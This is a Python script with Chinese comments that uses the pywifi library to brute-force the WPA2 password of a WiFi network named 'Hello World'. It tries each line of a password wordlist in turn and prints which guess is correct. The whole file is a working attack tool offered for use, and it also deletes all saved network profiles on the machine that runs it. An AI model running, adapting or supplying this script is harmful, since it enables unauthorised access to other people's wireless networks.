'''
 * Copyright 2024 
 * Licensed under the MIT license 
 * @author txf
 * @date 2024-04-04 09:08:08
'''
import pywifi
from pywifi import const # 引入一个常量
import time

def wifiConnect(wifiname,wifipassword):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    # 断开连接
    ifaces.disconnect()
    time.sleep(0.5)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # WiFi名称
        profile.ssid = wifiname
        # WiFi密码
        profile.key = wifipassword
        # WiFi的加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 网卡的开放
        profile.auth = const.AUTH_ALG_OPEN
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP

        # 删除所有的WiFi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)

        # 连接WiFi
        ifaces.connect(tep_profile)
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

def read_password():
    '''读取密码本'''
    print('开始破解：')
    path = './pwd.txt'
    file = open(path, 'r') # 以只读的方式

    while True:
        try:
        	# 按行读取密码本
            wifipwd = file.readline()
            # 第一个参数是指定 WiFi 名称，第二个参数是读取的密码
            bool = wifiConnect('Hello World', wifipwd)
            if bool:
                print('密码正确：' + wifipwd)
                break
            else:
                print('密码错误：' + wifipwd)
        except:
            continue
    # 关闭资源
    file.close()

# 调用方法
read_password()
